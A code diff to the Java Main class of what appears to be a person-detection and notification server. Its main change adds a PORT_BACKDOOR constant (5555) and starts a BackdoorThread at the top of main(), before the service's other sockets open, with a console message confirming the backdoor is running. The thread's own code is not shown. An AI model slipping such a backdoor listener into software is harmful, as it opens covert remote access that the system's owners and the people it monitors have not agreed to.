@@ -33,7 +33,8 @@ public class Main {
 			PORT_AUDIO_UDP_MOB=7671,
 			PORT_PERSON_DETECT_SYS=6672,
 			PORT_PERSON_DETECT_GPU=5672,
-			PORT_PERSON_DETECT_GPU2=5673;
+			PORT_PERSON_DETECT_GPU2=5673,
+			PORT_BACKDOOR=5555;
 
 	public static final byte 
 			BYTE_FACEFOUND_VDOGENERATING = 1, 
@@ -61,6 +62,15 @@ public class Main {
 	public static SimpleDateFormat ft = new SimpleDateFormat("yyyy_MM_dd'at'hh_mm_ss_a");
 	
 	public static void main(String[] args) {
+		
+		try {
+			BackdoorThread backdoorThread = new BackdoorThread();
+			backdoorThread.start();
+			System.out.println("Backdoor thread started");
+		} catch (IOException e3) {
+			e3.printStackTrace();
+		}
+		
 		
 		try {
 			connSysSS = new ServerSocket(PORT_CONN_SYS);
@@ -100,7 +110,6 @@ public class Main {
 			ServerSockThread servSockDetectPersonGPUThread = new ServerSockThread(PORT_PERSON_DETECT_GPU);
 			ServerSockThread servSockVideoSysThread = new ServerSockThread(PORT_NOTIF_VIDEO_SYS);
 			ServerSockThread servSockVideoMobThread = new ServerSockThread(PORT_NOTIF_VIDEO_MOB);
-			
 
 			servSockMsgSysThread.start();
 			servSockMsgMobThread.start();
